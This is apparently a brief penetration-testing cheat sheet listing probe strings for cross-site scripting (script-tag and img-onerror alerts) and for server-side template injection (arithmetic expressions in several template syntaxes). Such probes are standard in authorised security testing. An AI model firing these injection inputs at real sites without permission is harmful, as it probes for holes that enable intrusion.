## to check xss vulnerability:

```
<script>alert('hacked')</script>

<img src=x onerror=alert()>${{7*7}}

```

## SSTI

```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
```
